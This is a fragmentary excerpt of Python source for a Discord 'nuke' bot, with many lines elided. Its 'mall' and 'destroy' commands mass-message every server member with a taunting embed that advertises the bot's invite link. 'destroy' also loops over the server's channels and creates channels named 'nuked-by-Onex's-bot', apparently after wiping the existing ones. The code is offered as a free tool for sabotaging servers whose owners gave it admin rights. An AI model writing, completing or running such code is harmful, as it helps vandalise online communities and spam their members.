...
async def mall(ctx):
    ...
    for member in list(client.get_all_members()):
        ...
        try:
            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://discord.gg/QDnXbZ5NRB", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/QDnXbZ5NRB)",
                inline=False)
            embed.add_field(
            ...
            embed.add_field(
                ...
                "[ [ Click here ] ](https://discord.gg/QDnXbZ5NRB)",
                inline=False)
            embed.set_thumbnail(url="https://github.com/0neX-Dev/0neX-Dev/compare/main...0neX-Dev-patch-0.1?expand=1")
            embed.set_footer(text="nuked-by-Onex's-bot-check-dms By One X#303 Bot! Sorry About Your Loss")
            await member.send(embed=embed)
        except:
            pass
...
async def destroy(ctx):
    ...
    for member in list(client.get_all_members()): 
        ...
        try:
            ...
            embed.add_field(
                ...
                inline=False)
            embed.set_thumbnail(url="https://github.com/0neX-Dev/0neX-Dev/compare/main...0neX-Dev-patch-0.1?expand=1")
            embed.set_footer(text="nuked-by-Onex's-bot-check-dms By One X#3031 Bot! Sorry About Your Loss")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
    for channel in list(ctx.message.guild.channels):
        try:
            ...
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("nuked-by-Onex's-bot-check-dms By Social's Bot! Check Dms")
